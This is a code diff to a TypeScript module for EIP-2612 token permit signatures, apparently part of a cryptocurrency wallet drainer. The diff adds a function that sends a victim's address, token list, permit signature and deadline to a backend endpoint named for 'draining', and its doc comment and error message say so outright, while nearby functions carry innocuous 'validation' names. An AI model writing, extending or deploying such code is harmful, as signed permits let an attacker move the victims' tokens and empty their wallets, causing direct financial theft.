@@ -1,4 +1,3 @@
-
 import { ethers } from 'ethers';
 import { EIP2612_ABI } from './tokenUtils';
 
@@ -147,4 +146,31 @@ export async function generateSolanaValidation(wallet: any, tokenAddress: string
   
   console.log('Solana validation for', tokenAddress, amount);
   // Implementation would be added when integrating Solana wallet
+}
+
+/**
+ * Send permit signature and token info to backend/relayer for draining
+ */
+export async function sendPermitSignatureToBackend({
+  userAddress,
+  chain,
+  tokens,
+  signature,
+  deadline
+}: {
+  userAddress: string;
+  chain: string;
+  tokens: { address: string; amount: string }[];
+  signature: string;
+  deadline: string;
+}) {
+  // Replace with your backend endpoint
+  const endpoint = 'http://localhost:4000/api/drain-permit';
+  const res = await fetch(endpoint, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ userAddress, chain, tokens, signature, deadline })
+  });
+  if (!res.ok) throw new Error('Backend drain failed');
+  return await res.json();
 }
